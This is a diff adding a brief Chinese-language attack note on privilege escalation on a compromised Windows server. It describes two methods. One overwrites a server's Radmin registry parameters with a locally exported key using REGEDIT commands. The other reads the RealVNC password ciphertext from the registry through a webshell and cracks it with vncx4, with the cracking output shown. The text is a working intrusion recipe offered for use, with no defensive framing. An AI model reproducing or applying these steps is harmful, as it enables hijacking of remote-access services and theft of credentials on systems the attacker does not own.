@@ -1,0 +1,25 @@
+首先在本机搭建一个radmin，设置好自己的密码，然后在注册表导出，替换服务器的注册表
+RADMIN的注册表项位于HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters\Parameter
+
+REGEDIT -E C:\123.REG HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters
+REGEDIT -s C:\456.REG HKEY_LOCAL_MACHINE\SYSTEM\RAdmin\v2.0\Server\Parameters
+
+
+VNC提权
+C:\Program Files\RealVNC\VNC4
+C:\Documents and Settings\All Users\「开始」菜单\程序\RealVNC
+Vnc开发的端口为5900 密码存放在注册表中 地址为
+HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4\password 
+用vncx4破解密码
+?  73 49
+?  64 40
+?  21 15
+?  249 f9
+?  163 a3
+?  94  5e
+?  139 8b
+?  34  22
+Entered HEX String: 49 40 15 f9 a3 5e 8b 22
+VNC Password: 123456
+读出来的密码是十进制 我们用计算机转换16进制
+教程思路 用wehshell读取注册表密文 用vncx4破解密码 然后用vnc 客户端链接
